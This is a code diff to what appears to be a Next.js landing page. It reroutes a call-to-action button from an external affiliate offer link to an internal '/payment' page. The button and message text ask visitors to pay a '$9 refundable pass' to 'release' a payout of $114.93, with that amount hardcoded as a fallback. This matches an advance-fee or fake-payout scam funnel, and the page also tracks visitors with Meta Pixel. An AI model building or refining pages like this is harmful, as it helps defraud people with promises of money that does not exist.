@@ -4,6 +4,7 @@
 import { motion } from 'framer-motion';
 import { Check, CreditCard, Info, Pause, Play, Send, User, Volume2 } from 'lucide-react';
 import Image from 'next/image';
+import Link from 'next/link';
 import { memo, useEffect, useRef, useState } from 'react';
 import MetaPixelTracker from '../../components/MetaPixelTracker';
 
@@ -2167,10 +2168,8 @@ export default function Page() {
                         <em>(Click the button below to confirm your $9 refundable pass and release your ${(displayBalance || 114.93).toFixed(2)} payout)</em>
                       </MessageBubble>
 
-                      <a
-                        href="https://giftclick.org/?offer_id=1970&aff_id=208871&aff_c=1"
-                        target="_blank"
-                        rel="noopener noreferrer"
+                      <Link
+                        href="/payment"
                         className="verification-btn pop-bounce"
                         style={{
                           display: 'block',
@@ -2184,7 +2183,7 @@ export default function Page() {
                         }}
                       >
                         RELEASE ${(displayBalance || 114.93).toFixed(2)} PAYOUT ($9 REFUNDABLE PASS) ➔
-                      </a>
+                      </Link>
                     </>
                   )}
                 </div>
